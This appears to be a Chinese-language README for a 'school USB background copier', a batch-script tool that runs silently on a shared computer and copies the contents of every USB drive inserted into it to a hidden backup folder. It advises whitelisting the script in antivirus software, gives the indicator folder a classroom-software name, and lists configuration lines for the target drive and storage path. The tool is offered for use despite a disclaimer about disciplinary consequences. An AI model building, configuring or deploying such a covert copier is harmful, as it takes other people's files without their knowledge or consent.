# 学校U盘后台复制器
可以在后台静默复制的脚本

**！使用本软件造成的所有后果由使用者承担！**

# U盘后台复制器使用说明（使用后对使用者产生的处分， 精神伤害？等后果自负！！！！！！）
----------------------------------------------------------------------------------------------------------------------------------------
**双击文件夹内.exe程序 一次 运行 （点我静默运行.exe）**

U盘插入后没复制，没反应？看到本文档最底部

（对有杀毒软件）可能需要添加白名单列表：

C:\Windows\System32\xcopy.exe
C:\Windows\System32\cmd.exe
（本目录）\点我静默运行.exe
（本目录）\code.bat

运行时会在桌面上创建seewo文件夹（默认）表示已启动，
正常退出时会删除。（不是任务管理器结束，请看退出方法）

## 退出方法：
找到D:\backups\control\  （默认路径
在里面创建一个叫end的空文件（无后缀
几秒后end和桌面上的seewo文件夹一起关闭表示已退出
**意外发生错误退出/任务管理器结束  怎么办：删除桌面上的seewo文件夹再点击exe程序即可（启动后会再自动生成seewo文件夹）**

## control文件  （默认放在  D:\backups\control\  下）无后缀
创建方法：右键-新建-新建文本文档-把文件连同后缀一起删除
（没有后缀.txt？ [教程](https://cn.bing.com/search?q=windows%E5%A6%82%E4%BD%95%E6%98%BE%E7%A4%BA%E5%90%8E%E7%BC%80 "教程") ）

支持的control文件：
end     表示结束
stop    表示暂停

## 日志文件：
默认在 D:\backups\ 下的 log.txt

## 已复制列表（在下次插入U盘时不会再复制，可以手动删除来复制）
默认在 D:\backups\ 下的 nolist.txt

## 复制结果：
默认在 D:\backups\results\ 下 

## 如何防止自己的U盘被复制？
在U盘根目录下创建叫 nocopy 的无后缀空文件



## 高级

编辑code.bat，前几行：

set "drive_letter=F"                                               ::U盘驱动器号（对于U盘插入后没反应的修改）
set "target=D:\backups"                                            ::复制到的路径（也可以藏到C盘里，但注意权限问题）
set "countdown=10"                                                 ::反应时间 秒（一般默认就好，太短占cpu，太长反应慢）
set "desktop_folder=seewo"                                         ::表示启动时在桌面上创建的文件夹名（不要设已存在的，尤其是里面有东西的
set ymd=%date:~0,4%-%date:~5,2%-%date:~8,2%                        ::日志输出日期格式（日志有问题再更改，否则不要动）


注意是在code.bat里编辑，别傻傻的在这个文件里改啊！
如何编辑.bat（批处理文件）？    右键code.bat-编辑       或      右键code.bat-显示更多选项-编辑




** 对于code.bat后面的代码除非你知道你在干什么，不建议乱动 **
